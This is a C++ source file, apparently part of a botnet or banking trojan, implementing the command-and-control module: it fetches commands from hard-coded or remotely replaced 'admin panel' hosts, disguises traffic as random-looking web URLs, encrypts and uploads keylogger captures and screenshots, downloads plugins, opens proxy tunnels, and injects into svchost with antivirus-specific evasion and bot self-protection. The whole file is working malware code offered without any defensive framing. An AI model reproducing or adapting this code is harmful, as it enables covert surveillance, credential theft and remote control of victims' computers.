#include "main.h"
#include "AdminPanel.h"
#include "Manager.h"
#include "core\crypt.h"
#include "core\http.h"
#include "core\file.h"
#include "core\debug.h"
#include "core\hook.h"
#include "VideoServer.h"
#include "task.h"
#include "MonitoringProcesses.h"
#include "core\HttpProxy.h"
#include "core\ThroughTunnel.h"
#include "core\proxy.h"
#include "other.h"
#include "system.h"
#include "core\pe.h"

extern char fileDropper[MAX_PATH];
uint GetCurrDate();

namespace AdminPanel
{

int numAdmin; //номер текущей админки
int numAdminAZ; //номер текущей админки az

const int CountSimpleExts = 7;
char* SimpleExts[CountSimpleExts] = { _CT_(".gif"), _CT_(".jpg"), _CT_(".png"), _CT_(".htm"), _CT_(".html"), _CT_(".php"), _CT_(".shtml") };
const int CountParamsExts = 3;
char* ParamsExts[CountParamsExts] = { _CT_(".php"), _CT_(".bml"), _CT_(".cgi") };

Proxy::Connector* connector;
const int MaxDuplHashs = 8;
static uint duplHashs[MaxDuplHashs];
static int countDuplHashs = 0;
static int duplDst = 0; //куда дублировать данные: 1 - в файлы, 2 - на сервер, 3 - в файлы и на сервер
static char* newAdminka = 0; //здесь хранятся адреса админок заданных командой adminka new, используются вместо вшитых
CRITICAL_SECTION lockHosts; //блокировка 

const int MaxTogetherLogCode = 5; //сколько кодов можно одновременно отослать
const int MaxLogCodes = 20; //сколько можно хранить лог кодов
int* logCodes = 0; //коды логов на отправку
int countLogCodes = 0; //сколько кодов запомнено в массиве
CRITICAL_SECTION lockLog;

bool Init()
{
	numAdmin = 0;
	numAdminAZ = 0;
	newAdminka = 0;
	if( !Socket::Init() ) return false;
	connector = new Proxy::Connector();
	countDuplHashs = 0;
	CriticalSection::Init(lockHosts);

	logCodes = new int[MaxLogCodes];
	countLogCodes = 0;
	CriticalSection::Init(lockLog);

	return true;
}

void Release()
{
	delete connector;
	Str::Free(newAdminka);
}

//проверяет есть ли связь с какой либо админкой
static bool VerifyConnect()
{
	StringBuilder hosts( MaxSizeHostAdmin, DECODE_STRING(Config::Hosts) );
	StringArray hs = hosts.Split('|');
	bool ret = false;
	if( hs.Count() > 0 )
	{
		for( int i = 0; i < hs.Count(); i++ )
		{
			int sc = Socket::ConnectHost( hs[i]->c_str() );
			if( sc > 0 )
			{
				Socket::Close(sc);
				ret = true;
				break;
			}
		}
	}
	else
		ret = true;
	return ret;
}

bool GetHostAdmin( int type, StringBuilder& host )
{
	CriticalSection cs(lockHosts);
	int* num = 0;
	switch(type)
	{
		case 0: 
			num = &numAdmin; 
			break;
		case 1: num = &numAdminAZ; break;
		default:
			return false;
	}
	StringBuilder hosts;
	if( GetHosts( type, hosts ) )
	{
		StringArray hs = hosts.Split('|');
		if( hs.Count() > 0 )
		{
			if( *num > hs.Count() || *num < 0 ) *num = 0;
			host = hs[*num];
			return true;
		}
	}
	return false;
}

bool GetHosts( int type, StringBuilder& hosts )
{
	const char* config_hosts = 0;
	bool encoded = true; //зашифрованы ли хосты
	switch(type)
	{
		case 0: 
			if( newAdminka )
			{
				config_hosts = newAdminka;
				encoded = false;
			}
			else
				config_hosts = Config::Hosts;
			break;
		case 1: config_hosts = Config::HostsAZ; break;
		default:
			return false;
	}
	hosts = encoded ? DECODE_STRING(config_hosts) : config_hosts;
	return true;
}

static int CorrectlyInsert( int i, StringBuilder& s, const char* v, int c_v = -1 )
{
	while( i < s.Len() - 1 )
	{
		if( s[i - 1] != '-' && s[i - 1] != '.' && s[i] != '-' && s[i] != '.' )
		{
			s.Insert( i, v, c_v );
			return i;
		}
		i++;
	}
	return -1;
}

//возвращает позицию после вставленного расширения
static int InsertDirectories( StringBuilder& s, int len )
{
	char slash[2];
	slash[0] = '/';
	slash[1] = 0;
	int slashs = Rand::Gen( 1, 4 );
	int p = 0;
	int maxDist = len / slashs; //максимально через сколько символов ставить слеш
	for( int i = 0; i < slashs && p < len; i++ )
	{
		p += Rand::Gen( 1, maxDist );
		int pp = CorrectlyInsert( p, s, slash, 1 );
		if( pp < 0 )
			break;
		p = pp + 1;
		len++;
	}
	return p;
}

static int InsertExt( int i, StringBuilder& s, const char** exts, int c_exts )
{
	int n = Rand::Gen(c_exts - 1);
	StringBuilderStack<8> ext( DECODE_STRING(exts[n]) );
	if( i == 0 ) //вставка в конец строки
	{
		s.Cat( ext, ext.Len() );
		return s.Len();
	}
	else
	{
		i = CorrectlyInsert( i, s, ext, ext.Len() );
		if( i < 0 )
			i = s.Len();
		else
			i += ext.Len();
		return i;
	}
}

static void TextToUrl( const char* psw, const StringBuilder& text, StringBuilder& url )
{
	StringBuilder s;
	s += '|';
	s += text;
	s += '|';
	int lenleft = Rand::Gen( 10, 20 );
	int lenright = Rand::Gen( 10, 20 );
	int lenres = s.Len() + lenleft + lenright;
	//делаем длину кратной 24, чтобы делилось на 3 (для base64 без = в конце) и на 8 (длина блока в RC2)
	int lenres2 = ((lenres + 23) / 24) * 24 - 1; //вычитаем 1, после шифрования будет кратно 8
	lenleft += lenres2 - lenres;
	StringBuilder left, right;
	Rand::Gen( left, lenleft );
	Rand::Gen( right, lenright );
	s.Insert( 0, left );
	s += right;
	Mem::Data data;
	data.Copy( s.c_str(), s.Len() );
	EncryptToText( data, url );
	if( Rand::Condition(50) )
	{
		int lendirs = Rand::Gen( url.Len() - 20, url.Len() - 10 ); //на какой длине могут быть директории
		InsertDirectories( url, lendirs );
		InsertExt( 0, url, (const char**)SimpleExts, CountSimpleExts );
	}
	else
	{
		int lendirs = Rand::Gen( url.Len() / 2 - 10, url.Len() / 2 + 10 ); //на какой длине могут быть директории
		int p = InsertDirectories( url, lendirs );
		if( lendirs - p > 0 )
			p = InsertExt( lendirs, url, (const char**)ParamsExts, CountParamsExts );
		char c1[2]; c1[0] = '?'; c1[1] = 0;
		p = CorrectlyInsert( p, url, c1, 1 ); //вставляем ?
		p++;
		c1[0] = '&'; //разделитель параметров
		char c2[2]; c2[0] = '='; c2[1] = 0;
		int params = Rand::Gen( 1, 4 );
		int lenparams = url.Len() - p;
		int distParam = lenparams / params;
		for( int i = 0; i < params; i++ )
		{
			int p2 = p + Rand::Gen( 1, distParam );
			int p4 = p2 + 1; //позиция следующего параметра
			if( p2 > url.Len() || i == params - 1 ) 
				p2 = url.Len();
			else
			{
				p2 = CorrectlyInsert( p2, url, c1, 1 );
				p4++;
			}
			if( p2 < 0 ) break;
			int p3 = Rand::Gen( p + 2, p2 - 1 );
			p3 = CorrectlyInsert( p3, url, c2, 1 );
			p = p4 + 1;
			if( p >= url.Len() ) break;
		}
	}
}


//формирует запрос в админку
bool GenUrl( int type, HTTP::Request& request, const StringBuilder& text )
{
	StringBuilderStack<64> host;
	if( GetHostAdmin( type, host ) )
	{
		request.SetHost(host);
		//генерируем урл
		StringBuilder url;
		switch( type )
		{
			case 0:
				TextToUrl( DECODE_STRING(Config::Password), text, url );
				break;
			case 1:
				url = text;
				break;
		}
		request.SetFile(url);
		return true;
	}
	return false;
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////
/// функции передачи и получения данных админки
///////////////////////////////////////////////////////////////////////////////////////////////////////////

bool GetCmd( StringBuilder& cmd )
{
#ifndef IP_SERVER_FROM_DNS
	StringBuilder text;
	text += Config::UID;
	HTTP::Request request(connector);
	if( GenUrl( 0, request, text ) )
	{
		DbgMsg( "Отстук: text %s", text.c_str() );
		DbgMsg( "Отстук: url %s", request.GetUrl(text).c_str() );
		if( request.Get(10000) )
		{
			Mem::Data data;
			if( Decrypt( request.Response(), data ) )
			{
				data.ToString(cmd);
				return true;
			}
		}
	}
#else
	StringBuilderStack<128> host;
	if( GetHostAdmin( 0, host ) )
	{
		StringBuilderStack<64> prefix;
		Rand::Gen( prefix, 4, 8 );
		prefix += (uint)API(KERNEL32, GetTickCount)();
		prefix += '.';
		prefix += Config::XorMask;
		prefix += '.';
		host.Insert( 0, prefix );
		DbgMsg( "Узнаем IP %s", host.c_str() );
		char ip[24];
		if( Socket::HostToIP( host, ip ) )
		{
			DbgMsg( "У %s IP: %s", host.c_str(), ip );
			if( Str::Cmp( ip, _CS_("127.0.0.1") ) != 0 )
			{
				cmd = _CS_("server force ");
				cmd += ip;
				cmd += _CS_(":443");
				return true;
			}
		}
		else
			DbgMsg( "Не удалось получить IP" );
	}
#endif
	return false;
}

static void DuplDataKeylogger( const char* nameData, const char* nameProcess, const char* data, int c_data, const char* fileName )
{
	if( duplDst & 1 )
	{
		StringBuilderStack<MAX_PATH> path;
		Config::GetBotFolder( path, nameData, true );
		Path::AppendFile( path, nameProcess );
		path += _CS_(".txt");
		File::Append( path, data, c_data );
	}
	if( duplDst & 2 )
	{
		ManagerServer::SendFileToVideoServer( _CS_("keylogger"), nameProcess, _CS_("txt"), data, c_data );
	}
}

static void DuplDataScreenshot( const char* nameData, const char* nameProcess, const char* data, int c_data, const char* fileName )
{
	if( duplDst & 1 )
	{
		StringBuilderStack<MAX_PATH> path;
		Config::GetBotFolder( path, nameData, true );
		Path::AppendFile( path, nameProcess );
		path += '.';
		path += (uint)API(KERNEL32, GetTickCount)();
		path += '_';
		path += fileName;
		File::WriteAll( path, data, c_data );
	}
	if( duplDst & 2 )
	{
		ManagerServer::SendFileToVideoServer( _CS_("screenshots"), nameProcess, _CS_("png"), data, c_data );
	}
}

static void DuplData( const char* nameData, const char* nameProcess, const char* data, int c_data, const char* fileName )
{
	uint hashData = Str::Hash(nameData);
	for( int i = 0; i < countDuplHashs; i++ )
	{
		if( duplHashs[i] == hashData )
		{
			switch( hashData )
			{
				case 0x0035ac12: //keylogger
					DuplDataKeylogger( nameData, nameProcess, data, c_data, fileName );
					break;
				case 0x0bc205e4: //screenshot
					DuplDataScreenshot( nameData, nameProcess, data, c_data, fileName );
					break;
			}
			break;
		}
	}
}

bool SendData( MsgSendData* data )
{
	bool ret = false;
	DuplData( data->nameData, data->nameProcess, data->data, data->c_data, data->fileName );

#ifdef ON_SENDDATA_FOLDER
	StringBuilderStack<MAX_PATH> fileName = "c:\\botdebug\\";
	char time[16];
	Str::ToString( (uint)GetTickCount(), time );
	fileName += data->nameProcess;
	fileName += '.';
	fileName += data->nameData;
	fileName += '.';
	fileName += time;
	fileName += '.';
	if( data->file )
		fileName += data->fileName;
	else
		fileName += "txt";
	File::WriteAll( fileName, data->data, data->c_data );
#endif

	StringBuilderStack<256> text;
	text += Config::UID;
	text += '|';
	text += _CS_("data=");
	text += data->nameData;
	text += '|';
	text += _CS_("process=");
	text += data->nameProcess;
	text += '|';
	text += _CS_("idprocess=");
	text += data->hprocess;
	DbgMsg( "Отсылка данных: '%s'", text.c_str() );

	HTTP::Request request(connector);
	if( GenUrl( 0, request, text ) )
	{
		if( data->file )
		{
			Mem::Data postMP;
			if( EncryptToBin( data->data, data->c_data, postMP ) )
			{
				HTTP::PostDataMultipart mp(request);
				mp.AddFile( _CS_("upload"), data->fileName, postMP );
				mp.End();
				ret = true;
			}
		}
		else
		{
			StringBuilder postText;
			if( EncryptToText( data->data, data->c_data, postText ) )
			{
				request.SetContentWebForm();
				int p = Rand::Gen( 4, 12 );
				postText.Insert( p, '=' );
				request.AddPostData(postText);
				ret = true;
			}
		}
		if( ret )
			request.Post(10000);
	}
	return ret;
}

bool LoadPlugin( const char* namePlugin, Mem::Data& plugin )
{
	StringBuilderStack<64> text;
	text += Config::UID;
	text += '|';
	text += _CS_("plugin=");
	text += namePlugin;
	HTTP::Request request(connector);
	DbgMsg( "Загрузка плагина: %s", text.c_str() );
#ifdef ON_PLUGINS_FOLDER
	StringBuilderStack<MAX_PATH> fileName = "c:\\plugins\\";
	fileName += namePlugin;
	if( File::IsExists(fileName) )
	{
		File::ReadAll( fileName, plugin );
		return true;
	}
	else
		return false;
#else
	if( AdminPanel::GenUrl( 0, request, text ) )
	{
		for( int i = 0; i < 10; i++ ) //делаем 10 попыток загрузить плагин
		{
			StringBuilder u;
			DbgMsg( "%s", request.GetUrl(u).c_str() );
			if( request.Get(5000) )
			{
				if( request.AnswerCode() == 200 )
				{
					if( Decrypt( request.Response(), plugin ) )
					{
						if( plugin.Len() > 0 )
							return true;
					}
				}
				else
					DbgMsg( "При загрузке плагина '%s' вернули HTTP ошибку %d", namePlugin, request.AnswerCode() );
			}
			else
				DbgMsg( "Ошибка выполнения запроса для загрузки плагина '%s'", namePlugin );
			DbgMsg( "Не удалось загрузить плагин, пробуем еще раз" );
			Delay(1000);
		}
	}
	return false;
#endif
}

//отправляет данные в админку в строке get запроса
bool SendDataCrossGet( StringBuilder& s )
{
	StringBuilder text(256);
	text += Config::UID;
	text += '|';
	text += s;
	HTTP::Request request(connector);
	DbgMsg( "Отправка данных GET запросом %s", text.c_str() );
	if( AdminPanel::GenUrl( 0, request, text ) )
		return request.Get(5000);
	return false;
}

void SendLog( const MsgLog* m )
{
	if( logCodes == 0 ) return;
	CriticalSection cs(lockLog);
	if( m->code > 0 )
	{
		logCodes[countLogCodes++] = m->code;
	}
	if( countLogCodes >= MaxTogetherLogCode || m->flush )
	{
		do
		{
			StringBuilderStack<64> s;
			s += _CS_("log=");
			int i = 0;
			for( ; i < countLogCodes; i++ )
			{
				if( i > 0 ) s += ',';
				s += logCodes[i];
			}
			SendDataCrossGet(s);
			countLogCodes -= i;
		} while( countLogCodes > 0 );
	}
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////

bool EncryptToBin( const void* data, int c_data, Mem::Data& dst )
{
	if( dst.Copy( data, c_data ) > 0 )
	{
		byte IV[8];
		Rand::Gen( IV, 8 );
		if( Crypt::EncodeRC2( DECODE_STRING(Config::Password), (char*)IV, dst ) )
		{
			dst.Insert( 0, IV, sizeof(IV) );
			return true;
		}
	}
	return false;
}

bool EncryptToText( const void* data, int c_data, StringBuilder& dst )
{
	Mem::Data dstData;
	if( dstData.Copy( data, c_data ) > 0 )
	{
		StringBuilderStack<10> IV;
		Rand::Gen( IV, 8 );
		if( Crypt::EncodeRC2( DECODE_STRING(Config::Password), IV, dstData ) )
		{
			if( Crypt::ToBase64( dstData, dst ) )
			{
				dst.ReplaceChar( '/', '.' );
				dst.ReplaceChar( '+', '-' );
				dst.Insert( 0, IV );
				return true;
			}
		}
	}
	return false;
}

bool Decrypt( const Mem::Data& src, Mem::Data& dst )
{
	char IV[8];
	Mem::Copy( IV, src.Ptr(), sizeof(IV) );
	if(	dst.Copy( 0, sizeof(IV), src ) > 0 )
	{
		if( Crypt::DecodeRC2( DECODE_STRING(Config::Password), IV, dst ) )
		{
			return true;
		}
	}
	return false;
}

}

PipeInetRequest::PipeInetRequest()
{
}

PipeInetRequest::~PipeInetRequest()
{
}

static void HandlerGetCmd( Pipe::AutoMsg msg, DWORD )
{
	StringBuilder cmd;
	if( AdminPanel::GetCmd(cmd) )
	{
		Pipe::SendAnswer( msg, msg->cmd, cmd.c_str(), cmd.Len() + 1 );
	}
}

static void HandlerSendData( Pipe::AutoMsg msg, DWORD )
{
	AdminPanel::SendData( (AdminPanel::MsgSendData*)msg->data );
}

static void HandlerLoadFile( Pipe::AutoMsg msg, DWORD )
{
	HTTP::Request request( AdminPanel::connector );
	if( msg->data[0] < ' ' ) //указан тип админки
	{
		int type = msg->data[0] - 1;
		StringBuilderStack<64> host;
		if( !AdminPanel::GetHostAdmin( type, host ) )
			return;
		request.SetHost(host);
		request.SetFile( (char*)(msg->data + 1) );
	}
	else
	{
		request.SetUrl( (char*)msg->data );
	}
#ifdef DEBUG_STRINGS
	StringBuilder url;
	request.GetUrl(url);
	DbgMsg( "Выполнение запроса: '%s'", url.c_str() );
#endif
	if( request.Get(5000) )
	{
		if( request.AnswerCode() == 200 )
		{
			Pipe::SendAnswer( msg, msg->cmd, request.Response().Ptr(), request.Response().Len() );
		}
		else
			DbgMsg( "Запрос '%s' вернул HTTP ошибку %d", (char*)msg->data, request.AnswerCode() );
	}
	else
		DbgMsg( "Ошибка выполнения запроса для урла '%s'", (char*)msg->data );
}

static void HandlerLoadPlugin( Pipe::AutoMsg msg, DWORD )
{
	Mem::Data plugin;
	if( AdminPanel::LoadPlugin( (char*)msg->data, plugin ) )
		Pipe::SendAnswer( msg, msg->cmd, plugin.Ptr(), plugin.Len() );
	else //в случае ошибки загрузки сообщаем что плагин не загрузился
		Pipe::SendAnswer( msg, msg->cmd, 0, 0 );
}

static void StartHttpProxy( const void* data, int sz_data )
{
	int port = *((int*)data);
	HttpProxy* proxy = new HttpProxy(port);
	proxy->StartAsync();
}

static void StartIpPortProxy( const void* data, int sz_data )
{
	int port = *((int*)data);
	AddressIpPort* addr = (AddressIpPort*)((byte*)data + sizeof(port));
	ThroughTunnel* tunnel = new ThroughTunnel( port, addr->ip, addr->port );
	tunnel->StartAsync();
}

int PipeInetRequest::Handler( Pipe::Msg* msgIn, void** msgOut )
{
	int ret = 0;
	switch( msgIn->cmd )
	{
		case CmdGetCmd:
			HandlerAsync( HandlerGetCmd, msgIn );
			break;
		case CmdSendData:
			HandlerAsync( HandlerSendData, msgIn );
			break;
		case CmdLoadFile:
			HandlerAsync( HandlerLoadFile, msgIn );
			break;
		case CmdLoadPlugin:
			HandlerAsync( HandlerLoadPlugin, msgIn );
			break;
		case CmdTunnelHttp:
			StartHttpProxy( msgIn->data, msgIn->sz_data );
			break;
		case CmdTunnelIpPort:
			StartIpPortProxy( msgIn->data, msgIn->sz_data );
			break;
		case CmdSetProxy:
		case CmdDelProxy:
			{
				int count = *((int*)msgIn->data);
				Proxy::Info* addr = (Proxy::Info*)( (byte*)msgIn->data + sizeof(int) );
				if( msgIn->cmd == CmdSetProxy )
					AdminPanel::connector->Add( addr, count );
				else
					AdminPanel::connector->Del( addr, count );
			}
			break;
		case CmdGetProxy:
			result.Clear();
			result.Append( &AdminPanel::connector->c_addr, sizeof(AdminPanel::connector->c_addr) );
			result.Append( AdminPanel::connector->addr, sizeof(Proxy::Info) * AdminPanel::connector->c_addr );
			*msgOut = result.Ptr();
			ret = result.Len();
			break;
		case CmdDupl:
			if( msgIn->sz_data > sizeof(uint) )
			{
				uint hash = *((uint*)msgIn->data);
				AdminPanel::duplDst = *((int*)(msgIn->data + sizeof(uint)));
				if( AdminPanel::duplDst == 0 ) //отключение дублирования
				{
					int i = 0;
					//ищем хеш дублированных данных
					while( i < AdminPanel::countDuplHashs )
						if( AdminPanel::duplHashs[i] == hash ) //нашли
						{
							//удаляем хеш из массива
							AdminPanel::countDuplHashs--;
							while( i < AdminPanel::countDuplHashs )
							{
								AdminPanel::duplHashs[i] = AdminPanel::duplHashs[i + 1];
								i++;
							}
							break;
						}
						else
							i++;
				}
				else //добавляем новый хеш для дублирования
				{
					if( AdminPanel::countDuplHashs < AdminPanel::MaxDuplHashs )
						AdminPanel::duplHashs[AdminPanel::countDuplHashs++] = hash;
				}
			}
			break;
		case CmdNewAdminka:
			CriticalSection::Enter(AdminPanel::lockHosts);
			Mem::Free(AdminPanel::newAdminka);
			if( msgIn->sz_data == 0 ) //возрат к зашитым админкам
			{
				AdminPanel::newAdminka = 0;
				DbgMsg( "Новые хосты админки удалены" );
			}
			else
			{
				AdminPanel::newAdminka = Str::Duplication( (char*)msgIn->data, msgIn->sz_data );
				DbgMsg( "Установлены новые хосты для админки %s", AdminPanel::newAdminka );
			}
			AdminPanel::numAdmin = 0;
			CriticalSection::Leave(AdminPanel::lockHosts);
			break;
		case CmdSendDataCrossGet:
			AdminPanel::SendDataCrossGet( StringBuilder( 0, -1, (char*)msgIn->data, msgIn->sz_data - 1 ) );
			break;
		case CmdLog:
			AdminPanel::SendLog( (AdminPanel::MsgLog*)msgIn->data );
			break;
	}
	return ret;
}

bool PipeInetRequest::SendString( const char* namePipe, int cmd, const char* s, Pipe::typeReceiverPipeAnswer funcReceiver, const char* nameReceiver, DWORD tag )
{
	if( nameReceiver == 0 ) nameReceiver = Pipe::serverPipeResponse->GetName();
	//отправляем строку вместе с завершающим нулем
	return PipeClient::Send( namePipe, cmd, s, Str::Len(s) + 1, nameReceiver, funcReceiver, tag );
}

bool PipeInetRequest::Reg( int priority )
{
	return ManagerServer::RegAdminPanel( this, priority );
}

bool PipeInetRequest::GetCmd( const char* namePipe, Pipe::typeReceiverPipeAnswer funcReceiver, const char* nameReceiver )
{
	if( nameReceiver == 0 ) nameReceiver = Pipe::serverPipeResponse->GetName();
	return PipeClient::Send( namePipe, CmdGetCmd, 0, 0, nameReceiver, funcReceiver );
}

bool PipeInetRequest::SendData( const char* namePipe, const AdminPanel::MsgSendData* data, int c_data )
{
	return PipeClient::Send( namePipe, CmdSendData, data, c_data );
}

bool PipeInetRequest::LoadFile( const char* namePipe, const char* url, Pipe::typeReceiverPipeAnswer funcReceiver, const char* nameReceiver, DWORD tag )
{
	return SendString( namePipe, CmdLoadFile, url, funcReceiver, nameReceiver, tag );
}

bool PipeInetRequest::LoadPlugin( const char* namePipe, const char* plugin, Pipe::typeReceiverPipeAnswer funcReceiver, const char* nameReceiver, DWORD tag )
{
	return SendString( namePipe, CmdLoadPlugin, plugin, funcReceiver, nameReceiver, tag );
}

//проверяет есть ли связь со вшитыми админками и сервером
bool VerifyConnect()
{
	if( AdminPanel::VerifyConnect() ) return true;
#ifdef ON_VIDEOSERVER
	if( VideoServer::VerifyConnect() ) return true;
#endif
	return false;
}

DWORD WINAPI AdminPanelThread( void* )
{
	uint dateWork = Config::GetDateWork();
	if( dateWork != 0 )
	{
		for(;;)
		{
			uint dateCurr = GetCurrDate();
			if( dateWork <= dateCurr ) break;
			Delay(10000);
		}
	}

	if( Config::state & RUNNED_DUBLICATION )
	{
		if( UpdateIsDublication(fileDropper) ) //работающий бот обновился
		{
			if( fileDropper[0] )
			{
				Delay(2000); //на всякий случай подождем, чтобы успел обновиться работающий бот
				InstallBotThread(0); //запускаем чтобы сработало самоудаление
			}
			return 0;
		}
		Delay(5000); //на всякий случай подождем, чтобы работающий бот самоудалиться
		Config::state &= ~RUNNED_DUBLICATION;
	}
	if( !AdminPanel::Init() ) return 0;
	//стартанули после горячего обновления
	if( Config::state & RUNNED_UPDATE )
	{
		DbgMsg( "Проверка связи с админкой и сервером" );
		if( !VerifyConnect() ) //бывает что сразу после обновления нет связи по какой-то причине, поэтому пробуем перезапустится другими способами
		{
			if( RestartBot() )
			{
				DbgMsg( "Перезапуск прошел успешно" );
				return 0;
			}
		}
		fileDropper[0] = 0; //чтобы не сработало самоудаление
	}

	if( !Pipe::InitServerPipeResponse() ) return 0;
	if( Config::LoadNameManager() ) //обновление
	{
		Config::state |= EXTERN_NAME_MANAGER;
		Delay(5000);
	}
	Task::Init();

#ifdef NOT_EXPLORER
	RunThread( ManagerLoopThread, 0 );
#endif
	//инсталяцию делаем здесь, так как svchost может быть запущен с самыми высокими правами
	if( fileDropper[0] ) //был запущен дроппер
	{
		Config::fileNameBot[0] = 0; //чтобы не был заблокирован (защищен) дроппер
		RunThread( InstallBotThread, 0 ); //тут проводится установка для автозагрузки и следом удаляется бот
	}

	PipeInetRequest server;
	DbgMsg( "Запущен процесс работы с админкой, имя канала '%s'", server.GetName().c_str() );
	for( int i = 0; i < 50; i++ ) //регистрируемся в течении 5с, ждем пока в проводнике настроится бот
	{
		if( server.Reg(0) ) break; //регистрируем в менеджере канал работы с инетом
		Delay(100);
	}
	TaskServer taskServer;
	taskServer.Reg(); //регистрируем в менеджере сервер выполнения команд
	taskServer.StartAsync(false);
	Task::ProtectBot();
#ifdef ON_VIDEOSERVER
	VideoServer::Start();
#endif
	if( (Config::state & NOT_USED_INJECT) == 0 )
		MonitoringProcesses::Start();

	Proxy::Info proxyAddr[10];
	int c_proxy = FindProxyAddr( proxyAddr, 10 );
	ManagerServer::SetProxy( proxyAddr, c_proxy );
	RunThread( FindProxyAddrCrossSniffer, 0 );
	//FindAuthenticationProxy( proxyAddr, c_proxy );
#ifdef ON_FORMGRABBER
	FormGrabber::StartCrossSniffer();
#endif
	server.Start(false);
	return 0;
}

DWORD WINAPI AdminPanelProcess( void* )
{
	if( !InitBot() ) return 0;
	//защита от НОДа, обнуляем информацию о секциях
//	byte* base = (byte*)PE::GetImageBase();
//	base[0] = 0x00;
//	base[1] = 0x00;
//	PIMAGE_NT_HEADERS headers = PE::GetNTHeaders( PE::GetImageBase() );
//	Mem::Set( (byte*)headers + sizeof(IMAGE_NT_HEADERS), 0, headers->FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER)  );

	Rand::Init();
	AdminPanelThread(0);
//	ReleaseBot();
	if( (Config::state & NOT_EXIT_PROCESS) == 0 )
	{
		API(KERNEL32, ExitProcess)(0);
	}
	return 0;
}

static void RunAdminPanelInSvchost2(DWORD)
{
	JmpToSvchost1( AdminPanelProcess, Config::exeDonor );
}

bool RunAdminPanelInSvchost()
{
	if( Config::state & NOT_USED_SCVHOST )
	{
		AdminPanelThread(0);
		return true;
	}
	else
	{
		if( Config::AV == AV_TrandMicro )
			return JmpToSvchost1( AdminPanelProcess, Config::exeDonor ) != 0;
		else
			return JmpToSvchost2( AdminPanelProcess, Config::exeDonor ) != 0;
//		return JmpToSvchost1(AdminPanelProcess) != 0;
		//return JumpInSvchostRootkit(AdminPanelProcess) != 0;
	}
//	return InjectCrossRootkit( RunAdminPanelInSvchost2, 0 );
//	return JmpToSvchost1(AdminPanelProcess) != 0;
}

bool RunAdminPanel( bool thread )
{
	if( thread )
		return RunThread( AdminPanelThread, 0 );
	else
		AdminPanelThread(0);
	return true;
}

uint GetCurrDate()
{
	SYSTEMTIME st;
	API(KERNEL32, GetLocalTime)(&st);
	return (((((((st.wYear << 4) | st.wMonth) << 5) | st.wDay) << 5) | st.wHour) << 6) | st.wMinute;
}
